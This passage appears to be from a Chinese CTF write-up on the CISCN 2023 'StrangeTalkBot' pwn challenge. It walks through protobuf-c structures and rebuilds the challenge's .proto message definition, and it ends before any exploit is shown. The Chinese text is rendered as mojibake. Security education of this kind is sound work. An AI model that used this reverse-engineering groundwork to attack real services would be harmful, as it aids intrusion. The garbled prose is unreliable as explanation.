P0ach1l__Devicemsg *message,<br>                      <span class="hljs-type">uint8_t</span>       *out)<br>&#123;<br>  assert(message-&gt;base.descriptor == &amp;p0ach1l__devicemsg__descriptor);<br>  <span class="hljs-keyword">return</span> protobuf_c_message_pack ((<span class="hljs-type">const</span> ProtobufCMessage*)message, out);<br>&#125;<br><span class="hljs-type">size_t</span> p0ach1l__devicemsg__pack_to_buffer<span class="hljs-comment">/*ä¸ p0ach1l__devicemsg__pack ç±»ä¼¼ï¼Œä¸è¿‡æ˜¯å°†æ¶ˆæ¯æ‰“åŒ…åˆ°ä¸€ä¸ª ProtobufCBuffer ç±»å‹çš„ç¼“å†²åŒºï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ° uint8_t* æ•°ç»„ä¸­ã€‚*/</span><br>                     (<span class="hljs-type">const</span> P0ach1l__Devicemsg *message,<br>                      ProtobufCBuffer *buffer)<br>&#123;<br>  assert(message-&gt;base.descriptor == &amp;p0ach1l__devicemsg__descriptor);<br>  <span class="hljs-keyword">return</span> protobuf_c_message_pack_to_buffer ((<span class="hljs-type">const</span> ProtobufCMessage*)message, buffer);<br>&#125;<br>P0ach1l__Devicemsg *<br>       <span class="hljs-title function_">p0ach1l__devicemsg__unpack</span><br>                     <span class="hljs-params">(ProtobufCAllocator  *allocator,</span><br><span class="hljs-params">                      <span class="hljs-type">size_t</span>               len,</span><br><span class="hljs-params">                      <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>       *data)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> (P0ach1l__Devicemsg *)<br>     protobuf_c_message_unpack (&amp;p0ach1l__devicemsg__descriptor,<br>                                allocator, len, data);<br>&#125;<br><span class="hljs-type">void</span>   p0ach1l__devicemsg__free_unpacked<span class="hljs-comment">/*ä»äºŒè¿›åˆ¶æ•°æ®ä¸­è§£åŒ…å‡º P0ach1l__Devicemsg æ¶ˆæ¯ç»“æ„ã€‚*/</span><br>                     (P0ach1l__Devicemsg *message,<br>                      ProtobufCAllocator *allocator)<br>&#123;<br>  <span class="hljs-keyword">if</span>(!message)<br>    <span class="hljs-keyword">return</span>;<br>  assert(message-&gt;base.descriptor == &amp;p0ach1l__devicemsg__descriptor);<br>  protobuf_c_message_free_unpacked ((ProtobufCMessage*)message, allocator);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="P0ach1l-Devicemsgç»“æ„ä½“"><a href="#P0ach1l-Devicemsgç»“æ„ä½“" class="headerlink" title="P0ach1l__Devicemsgç»“æ„ä½“"></a>P0ach1l__Devicemsgç»“æ„ä½“</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">P0ach1l__Devicemsg</span></span><br><span class="hljs-class">&#123;</span><br>  ProtobufCMessage base;<br>  <span class="hljs-type">int64_t</span> actionid;<br>  <span class="hljs-type">int64_t</span> msgidx;<br>  <span class="hljs-type">int64_t</span> msgsize;<br>  ProtobufCBinaryData msgcontent;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="ProtobufCMessageç»“æ„ä½“"><a href="#ProtobufCMessageç»“æ„ä½“" class="headerlink" title="ProtobufCMessageç»“æ„ä½“"></a>ProtobufCMessageç»“æ„ä½“</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ProtobufCMessage</span> &#123;</span><br><span class="hljs-comment">/** The descriptor for this message type. */</span><br><span class="hljs-type">const</span> ProtobufCMessageDescriptor*descriptor;<br><span class="hljs-comment">/** The number of elements in `unknown_fields`. */</span><br><span class="hljs-type">unsigned</span>n_unknown_fields;<br><span class="hljs-comment">/** The fields that weren&#x27;t recognized by the parser. */</span><br>ProtobufCMessageUnknownField*unknown_fields;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="ProtobufCFieldDescriptorç»“æ„ä½“"><a href="#ProtobufCFieldDescriptorç»“æ„ä½“" class="headerlink" title="ProtobufCFieldDescriptorç»“æ„ä½“"></a>ProtobufCFieldDescriptorç»“æ„ä½“</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> ProtobufCFieldDescriptor p0ach1l__devicemsg__field_descriptors[<span class="hljs-number">4</span>] =<br>&#123;<br>  &#123;<br>    <span class="hljs-string">&quot;actionid&quot;</span>,<br>    <span class="hljs-number">1</span>,<br>    PROTOBUF_C_LABEL_REQUIRED,<br>    PROTOBUF_C_TYPE_SINT64,<br>    <span class="hljs-number">0</span>,   <span class="hljs-comment">/* quantifier_offset */</span><br>    offsetof(P0ach1l__Devicemsg, actionid),<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-number">0</span>,             <span class="hljs-comment">/* flags */</span><br>    <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved1,reserved2, etc */</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-string">&quot;msgidx&quot;</span>,<br>    <span class="hljs-number">2</span>,<br>    PROTOBUF_C_LABEL_REQUIRED,<br>    PROTOBUF_C_TYPE_SINT64,<br>    <span class="hljs-number">0</span>,   <span class="hljs-comment">/* quantifier_offset */</span><br>    offsetof(P0ach1l__Devicemsg, msgidx),<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-number">0</span>,             <span class="hljs-comment">/* flags */</span><br>    <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved1,reserved2, etc */</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-string">&quot;msgsize&quot;</span>,<br>    <span class="hljs-number">3</span>,<br>    PROTOBUF_C_LABEL_REQUIRED,<br>    PROTOBUF_C_TYPE_SINT64,<br>    <span class="hljs-number">0</span>,   <span class="hljs-comment">/* quantifier_offset */</span><br>    offsetof(P0ach1l__Devicemsg, msgsize),<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-number">0</span>,             <span class="hljs-comment">/* flags */</span><br>    <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved1,reserved2, etc */</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-string">&quot;msgcontent&quot;</span>,<br>    <span class="hljs-number">4</span>,<br>    PROTOBUF_C_LABEL_REQUIRED,<br>    PROTOBUF_C_TYPE_BYTES,<br>    <span class="hljs-number">0</span>,   <span class="hljs-comment">/* quantifier_offset */</span><br>    offsetof(P0ach1l__Devicemsg, msgcontent),<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-number">0</span>,             <span class="hljs-comment">/* flags */</span><br>    <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved1,reserved2, etc */</span><br>  &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ç»“æ„ä½“å®šä¹‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ProtobufCFieldDescriptor</span> &#123;</span><br>    <span class="hljs-comment">/** å­—æ®µåœ¨ .proto æ–‡ä»¶ä¸­æŒ‡å®šçš„åç§° */</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>        *name;<br><br>    <span class="hljs-comment">/** å­—æ®µåœ¨ .proto æ–‡ä»¶ä¸­æŒ‡å®šçš„æ ‡ç­¾å€¼ */</span><br>    <span class="hljs-type">uint32_t</span>          id;<br><br>    <span class="hljs-comment">/** å­—æ®µçš„ç±»å‹ï¼Œ`REQUIRED`ï¼ˆå¿…éœ€ï¼‰ï¼Œ`OPTIONAL`ï¼ˆå¯é€‰ï¼‰ï¼Œ`REPEATED`ï¼ˆé‡å¤ï¼‰ */</span><br>    ProtobufCLabel    label;<br><br>    <span class="hljs-comment">/** å­—æ®µçš„ç±»å‹ */</span><br>    ProtobufCType     type;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * å­—æ®µåœ¨ C ç»“æ„ä½“ä¸­çš„é‡åŒ–å­—æ®µåç§»é‡ï¼ˆä¾‹å¦‚ `has_MEMBER` å­—æ®µç”¨äºå¯é€‰å­—æ®µï¼Œæˆ–è€… `n_MEMBER` å­—æ®µç”¨äºé‡å¤å­—æ®µï¼Œæˆ–è€… `case` æšä¸¾ç”¨äº oneof å­—æ®µï¼‰ã€‚</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span>          quantifier_offset;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * å­—æ®µåœ¨ C ç»“æ„ä½“ä¸­çš„æˆå‘˜åç§»é‡</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span>          offset;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ç±»å‹ç‰¹å®šçš„æè¿°ç¬¦ã€‚</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * å¦‚æœ `type` æ˜¯ `PROTOBUF_C_TYPE_ENUM`ï¼Œåˆ™ `descriptor` æŒ‡å‘ç›¸åº”çš„ `ProtobufCEnumDescriptor`ã€‚</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * å¦‚æœ `type` æ˜¯ `PROTOBUF_C_TYPE_MESSAGE`ï¼Œåˆ™ `descriptor` æŒ‡å‘ç›¸åº”çš„ `ProtobufCMessageDescriptor`ã€‚</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * å¦åˆ™è¯¥å­—æ®µä¸º NULLã€‚</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">void</span>        *descriptor; <span class="hljs-comment">/* å¯¹äºæ¶ˆæ¯å’Œæšä¸¾ç±»å‹ */</span><br><br>    <span class="hljs-comment">/** å¦‚æœå®šä¹‰äº†é»˜è®¤å€¼ï¼Œåˆ™ä¸ºè¯¥å­—æ®µçš„é»˜è®¤å€¼ã€‚å¯ä»¥ä¸º NULLã€‚ */</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">void</span>        *default_value;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ ‡å¿—ä½å­—ã€‚å¯ä»¥è®¾ç½®é›¶ä¸ªæˆ–å¤šä¸ªåœ¨ `ProtobufCFieldFlag` æšä¸¾ä¸­å®šä¹‰çš„ä½ã€‚</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">uint32_t</span>          flags;<br><br>    <span class="hljs-comment">/** ä¸ºæœªæ¥ç”¨é€”ä¿ç•™çš„å­—æ®µ */</span><br>    <span class="hljs-type">unsigned</span>          reserved_flags;<br><br>    <span class="hljs-comment">/** ä¸ºæœªæ¥ç”¨é€”ä¿ç•™çš„å­—æ®µ */</span><br>    <span class="hljs-type">void</span>              *reserved2;<br><br>    <span class="hljs-comment">/** ä¸ºæœªæ¥ç”¨é€”ä¿ç•™çš„å­—æ®µ */</span><br>    <span class="hljs-type">void</span>              *reserved3;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="ProtobufCBinaryData"><a href="#ProtobufCBinaryData" class="headerlink" title="ProtobufCBinaryData"></a>ProtobufCBinaryData</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ProtobufCBinaryData</span> &#123;</span><br><span class="hljs-type">size_t</span>len;        <span class="hljs-comment">/**&lt; Number of bytes in the `data` field. */</span><br><span class="hljs-type">uint8_t</span>*data;      <span class="hljs-comment">/**&lt; Data bytes. */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘ä¿¡æ¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> ProtobufCMessageDescriptor p0ach1l__devicemsg__descriptor =<br>&#123;<br>  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,<br>  <span class="hljs-string">&quot;p0ach1l.devicemsg&quot;</span>,<br>  <span class="hljs-string">&quot;Devicemsg&quot;</span>,<br>  <span class="hljs-string">&quot;P0ach1l__Devicemsg&quot;</span>,<br>  <span class="hljs-string">&quot;p0ach1l&quot;</span>,<br>  <span class="hljs-keyword">sizeof</span>(P0ach1l__Devicemsg),<br>  <span class="hljs-number">4</span>,<br>  p0ach1l__devicemsg__field_descriptors,<br>  p0ach1l__devicemsg__field_indices_by_name,<br>  <span class="hljs-number">1</span>,  p0ach1l__devicemsg__number_ranges,<br>  (ProtobufCMessageInit) p0ach1l__devicemsg__init,<br>  <span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved[123] */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="ProtobufCMessageDescriptorç»“æ„ä½“"><a href="#ProtobufCMessageDescriptorç»“æ„ä½“" class="headerlink" title="ProtobufCMessageDescriptorç»“æ„ä½“"></a>ProtobufCMessageDescriptorç»“æ„ä½“</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ProtobufCMessageDescriptor</span> &#123;</span><br><span class="hljs-comment">/** Magic value checked to ensure that the API is used correctly. */</span><br><span class="hljs-type">uint32_t</span>magic;<br><br><span class="hljs-comment">/** The qualified name (e.g., &quot;namespace.Type&quot;). */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*name;<br><span class="hljs-comment">/** The unqualified name as given in the .proto file (e.g., &quot;Type&quot;). */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*short_name;<br><span class="hljs-comment">/** Identifier used in generated C code. */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*c_name;<br><span class="hljs-comment">/** The dot-separated namespace. */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*package_name;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Size in bytes of the C structure representing an instance of this</span><br><span class="hljs-comment"> * type of message.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">size_t</span>sizeof_message;<br><br><span class="hljs-comment">/** Number of elements in `fields`. */</span> <span class="hljs-comment">//æ•´ä¸ªæ¶ˆæ¯ä¸­ å…ƒç´ æ•°ä¸ªæ•°</span><br><span class="hljs-type">unsigned</span>n_fields;<br><span class="hljs-comment">/** Field descriptors, sorted by tag number. */</span> <span class="hljs-comment">//å­—æ®µæè¿°ç¬¦ï¼ŒæŒ‰æ ‡ç­¾ç¼–å·æ’åºï¼ŒæŒ‡å‘ç¬¬ä¸€ä¸ªå­—æ®µ</span><br><span class="hljs-type">const</span> ProtobufCFieldDescriptor*fields;<br><span class="hljs-comment">/** Used for looking up fields by name. */</span><br><span class="hljs-type">const</span> <span class="hljs-type">unsigned</span>*fields_sorted_by_name;<br><br><span class="hljs-comment">/** Number of elements in `field_ranges`. */</span><br><span class="hljs-type">unsigned</span>n_field_ranges;<br><span class="hljs-comment">/** Used for looking up fields by id. */</span><br><span class="hljs-type">const</span> ProtobufCIntRange*field_ranges;<br><br><span class="hljs-comment">/** Message initialisation function. */</span><br>ProtobufCMessageInitmessage_init;<br><br><span class="hljs-comment">/** Reserved for future use. */</span><br><span class="hljs-type">void</span>*reserved1;<br><span class="hljs-comment">/** Reserved for future use. */</span><br><span class="hljs-type">void</span>*reserved2;<br><span class="hljs-comment">/** Reserved for future use. */</span><br><span class="hljs-type">void</span>*reserved3;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="æ•°æ®ç±»å‹-å­—æ®µçš„æ€§è´¨"><a href="#æ•°æ®ç±»å‹-å­—æ®µçš„æ€§è´¨" class="headerlink" title="æ•°æ®ç±»å‹&amp;&amp;å­—æ®µçš„æ€§è´¨"></a>æ•°æ®ç±»å‹&amp;&amp;å­—æ®µçš„æ€§è´¨</h3><p>ProtobufCType ç»“æ„ä½“(type) æŒ‡å®šäº†å­—æ®µçš„ç±»å‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br><span class="hljs-number">0</span>PROTOBUF_C_TYPE_INT32,      <span class="hljs-comment">/**&lt; int32 */</span><br><span class="hljs-number">1</span>PROTOBUF_C_TYPE_SINT32,     <span class="hljs-comment">/**&lt; signed int32 */</span><br><span class="hljs-number">2</span>PROTOBUF_C_TYPE_SFIXED32,   <span class="hljs-comment">/**&lt; signed int32 (4 bytes) */</span><br><span class="hljs-number">3</span>PROTOBUF_C_TYPE_INT64,      <span class="hljs-comment">/**&lt; int64 */</span><br><span class="hljs-number">4</span>PROTOBUF_C_TYPE_SINT64,     <span class="hljs-comment">/**&lt; signed int64 */</span><br><span class="hljs-number">5</span>PROTOBUF_C_TYPE_SFIXED64,   <span class="hljs-comment">/**&lt; signed int64 (8 bytes) */</span><br><span class="hljs-number">6</span>PROTOBUF_C_TYPE_UINT32,     <span class="hljs-comment">/**&lt; unsigned int32 */</span><br><span class="hljs-number">7</span>PROTOBUF_C_TYPE_FIXED32,    <span class="hljs-comment">/**&lt; unsigned int32 (4 bytes) */</span><br><span class="hljs-number">8</span>PROTOBUF_C_TYPE_UINT64,     <span class="hljs-comment">/**&lt; unsigned int64 */</span><br><span class="hljs-number">9</span>PROTOBUF_C_TYPE_FIXED64,    <span class="hljs-comment">/**&lt; unsigned int64 (8 bytes) */</span><br><span class="hljs-number">0xa</span>PROTOBUF_C_TYPE_FLOAT,      <span class="hljs-comment">/**&lt; float */</span><br><span class="hljs-number">0xb</span>PROTOBUF_C_TYPE_DOUBLE,     <span class="hljs-comment">/**&lt; double */</span><br><span class="hljs-number">0xc</span>PROTOBUF_C_TYPE_BOOL,       <span class="hljs-comment">/**&lt; boolean */</span><br><span class="hljs-number">0xd</span>PROTOBUF_C_TYPE_ENUM,       <span class="hljs-comment">/**&lt; enumerated type */</span><br><span class="hljs-number">0xe</span>PROTOBUF_C_TYPE_STRING,     <span class="hljs-comment">/**&lt; UTF-8 or ASCII string */</span><br><span class="hljs-number">0xf</span>PROTOBUF_C_TYPE_BYTES,      <span class="hljs-comment">/**&lt; arbitrary byte sequence */</span><br><span class="hljs-number">0x10</span>PROTOBUF_C_TYPE_MESSAGE,    <span class="hljs-comment">/**&lt; nested message */</span><br>&#125; ProtobufCType;<br></code></pre></td></tr></table></figure><p>ProtobufCLabel ç»“æ„(label) æŒ‡å®šäº†å­—æ®µçš„æ€§è´¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br><span class="hljs-comment">/** A well-formed message must have exactly one of this field. */</span><br>    <span class="hljs-comment">//æ ¼å¼æ­£ç¡®çš„æ¶ˆæ¯å¿…é¡»å…·æœ‰æ­¤å­—æ®µ</span><br>PROTOBUF_C_LABEL_REQUIRED,<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A well-formed message can have zero or one of this field (but not</span><br><span class="hljs-comment"> * more than one).</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//æ ¼å¼æ­£ç¡®çš„æ¶ˆæ¯å¯ä»¥æœ‰é›¶ä¸ªæˆ–ä¸€ä¸ªæ­¤å­—æ®µï¼ˆä½†ä¸èƒ½è¶…è¿‡ä¸€ä¸ªï¼‰</span><br>PROTOBUF_C_LABEL_OPTIONAL,<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * This field can be repeated any number of times (including zero) in a</span><br><span class="hljs-comment"> * well-formed message. The order of the repeated values will be</span><br><span class="hljs-comment"> * preserved.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//æ­¤å­—æ®µå¯ä»¥åœ¨æ ¼å¼æ­£ç¡®çš„æ¶ˆæ¯ä¸­é‡å¤ä»»æ„æ¬¡æ•°ï¼ˆåŒ…æ‹¬é›¶ï¼‰ã€‚å°†ä¿ç•™é‡å¤å€¼çš„é¡ºåº</span><br>PROTOBUF_C_LABEL_REPEATED,<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * This field has no label. This is valid only in proto3 and is</span><br><span class="hljs-comment"> * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//æ­¤å­—æ®µæ²¡æœ‰æ ‡ç­¾ã€‚è¿™ä»…åœ¨proto3ä¸­æœ‰æ•ˆï¼Œç­‰æ•ˆäº OPTIONALï¼Œä½†ä¸æŸ¥è¯¢&quot;has&quot;é‡è¯ï¼ˆproto3ä¸­æ²¡æœ‰hasé‡è¯ï¼‰ã€‚</span><br>PROTOBUF_C_LABEL_NONE,<br>&#125; ProtobufCLabel;<br></code></pre></td></tr></table></figure><p>åé¢é¢˜ç›®ä¸­è¦ç”¨åˆ°çš„ ProtobufCBinaryData ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ProtobufCBinaryData</span> &#123;</span><br><span class="hljs-type">size_t</span>len;        <span class="hljs-comment">/**&lt; Number of bytes in the `data` field. */</span><br><span class="hljs-type">uint8_t</span>*data;      <span class="hljs-comment">/**&lt; Data bytes. */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="CISCN-2023-åˆèµ›-StrangeTalkBot"><a href="#CISCN-2023-åˆèµ›-StrangeTalkBot" class="headerlink" title="[CISCN 2023 åˆèµ›]StrangeTalkBot"></a>[CISCN 2023 åˆèµ›]StrangeTalkBot</h2><p>è¿™é‡Œå¯ä»¥ç›´æ¥çœ‹åˆ°ProtobufCMessageDescriptorç»“æ„ä½“çš„ä¿¡æ¯ï¼Œè‚¯å®šæ˜¯protoçš„é¢˜ï¼Œå‡½æ•°çš„ä½œç”¨è‚¯å®šå°±æ˜¯ååºåˆ—åŒ–äº†</p><p>ç›´æ¥ä¾¿ç„¶é­”æ•°ä¹Ÿæ˜¯å¯ä»¥çš„</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101229164.png" alt="image-20241210122942062"></p><p>åˆ†æç»“æ„ä½“è¿›è¡Œè¿˜åŸ</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101233016.png" alt="image-20241210123326927"></p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101234366.png" alt="image-20241210123410284"></p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101235061.png" alt="image-20241210123519961"></p><p>å†™å‡º.protoæºæ–‡ä»¶,ç¡®å®šç‰ˆæœ¬æ–¹æ³•ï¼Œå¦‚æœç”¨äº†requiredå°±æ˜¯2ç‰ˆæœ¬ï¼Œ3ç‰ˆæœ¬å–æ¶ˆäº†required</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">syntax</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;proto2&quot;</span><span class="hljs-comment">;</span><br>package p0ach1l<span class="hljs-comment">;</span><br>message devicemsg &#123;<br>  required sint64 actionid <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>  required sint64 msgidx <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>  required sint64 msgsize <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>  required bytes msgcontent <span class="hljs-operator">=</span> <span class="hljs-number">4</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘ä¸€ä¸‹,æ‰“åŒ…æˆåº“</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 